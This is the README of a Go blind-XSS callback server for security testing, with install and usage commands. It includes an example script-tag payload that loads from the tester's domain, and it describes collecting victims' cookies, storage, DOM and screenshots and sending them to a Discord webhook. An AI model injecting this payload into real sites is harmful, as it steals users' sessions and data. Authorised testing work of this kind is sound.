# BXss - Blind XSS Callback Server

A Go server for Blind XSS testing. Serves a payload on any path and collects browser data (cookies, storage, DOM, screenshot) via callback, sending results to a Discord webhook and saving locally.

## Install

```sh
go install github.com/0xRTH/bxss@latest
```

## Usage

```sh
bxss -webhook https://discord.com/api/webhooks/YOUR_WEBHOOK -domain yourdomain.com -p 8083
```

- `-webhook` (required): Discord webhook URL
- `-domain` (optional): Domain for callback URL (default: localhost)
- `-p` (optional): Port to run the server on (default: 8083)
- `-v` (optional): Verbose logging

## Example Payload

Add this to any page:
```html
<script src="http://yourdomain.com:8083/test"></script>
```

---
MIT License 